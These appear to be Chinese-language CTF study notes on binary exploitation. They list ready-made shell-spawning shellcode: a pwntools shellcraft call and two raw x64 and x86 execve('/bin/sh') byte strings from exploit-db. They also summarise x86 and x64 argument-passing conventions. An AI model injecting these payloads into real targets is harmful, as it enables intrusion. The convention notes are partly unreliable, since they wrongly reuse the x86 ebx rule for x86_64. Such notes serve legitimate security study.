## shellcode
pwntool生成shellcode，不過有44個字節比較大：
```
asm(shellcraft.sh())
```
x64上只有23個字節的shellcode
```
https://www.exploit-db.com/exploits/36858/
shellcode_x64 = "\x31\xf6\x48\xbb\x2f\x62\x69\x6e\x2f\x2f\x73\x68\x56\x53\x54\x5f\x6a\x3b\x58\x31\xd2\x0f\x05"
```
x86上的19個字節的shellcode，但是在這裏好像只能用上面這個
```
https://www.exploit-db.com/exploits/40131
"\x31\xc0\x50\x68\x2f\x2f\x73\x68\x68\x2f\x62\x69\x6e\x87\xe3\xb0\x0b\xcd\x80"
```
## 傳參約定
### 系统调用参数传递
x86_32
通过中断（int 0x80）来实现
寄存器 eax 中存放系统调用号，同时系统调用返回值也存放在 eax 中
当系统调用参数小于等于6个时，参数则必须按顺序放到寄存器 ebx，ecx，edx，esi，edi ，ebp中
当系统调用参数大于6个时，全部参数应该依次放在一块连续的内存区域里，同时在寄存器 ebx 中保存指向该内存区域的指针

x86_64
通过中断（syscall）指令来实现
寄存器 eax 中存放系统调用号，同时系统调用返回值也存放在 eax 中
当系统调用参数小于等于6个时，参数则必须按顺序放到寄存器 rdi，rsi，rdx，r10，r8，r9中
当系统调用参数大于6个时，全部参数应该依次放在一块连续的内存区域里，同时在寄存器 ebx 中保存指向该内存区域的指针
### 函数参数传递
x86_32
C调用约定（即用__cdecl关键字说明）按从右至左的顺序压参数入栈，由调用者把参数弹出栈。gcc 通过栈来传递参数的

 x86_64
当参数少于7个时， 参数从左到右放入寄存器: rdi, rsi, rdx, rcx, r8, r9。当参数为 7 个以上时， 前 6 个与前面一样， 但后面的依次从 "右向左" 放入栈中。 